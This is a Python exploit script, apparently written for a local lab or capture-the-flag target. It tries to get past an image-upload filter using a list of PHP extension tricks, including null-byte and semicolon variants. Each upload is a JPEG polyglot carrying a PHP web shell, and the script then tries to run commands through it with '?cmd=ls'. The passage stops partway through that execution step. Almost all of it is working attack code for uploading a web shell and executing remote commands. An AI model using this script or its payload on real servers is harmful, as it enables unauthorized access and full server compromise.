import requests
import re

base_url = "http://127.0.0.1:32824"
print("Testing various PHP extension bypasses")
print("=" * 60)

# Different PHP extensions that might execute
php_extensions = ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar', '.pht', '.php.txt', '.php;.jpg', '.php%00.jpg']

# Create polyglot content with PHP payload
base_payload = b"<?php system($_GET['cmd']); ?>"
polyglot_base = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"

for ext in php_extensions:
    print(f"\n--- Testing extension: {ext} ---")
    
    filename = f"shell{ext}"
    content = polyglot_base + base_payload + b"\xff\xd9"
    
    files = {'userfile': (filename, content, 'image/jpeg')}
    data = {'submit': 'Upload Image'}
    
    try:
        response = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
        response_text = response.text
        
        if "Invalid Image" in response_text:
            print(f"❌ REJECTED: {filename}")
        elif "successfully uploaded" in response_text:
            print(f"✅ ACCEPTED: {filename}")
            # Extract upload path
            match = re.search(r"href='([^']+)'", response_text)
            if match:
                upload_path = match.group(1)
                print(f"   Upload path: {upload_path}")
                
                # Try to access and execute
                file_url = f"{base_url}/{upload_path}"
                test_url = f"{file_url}?cmd=ls"
                exec_resp = requests.get(test_url, timeout=10)
                
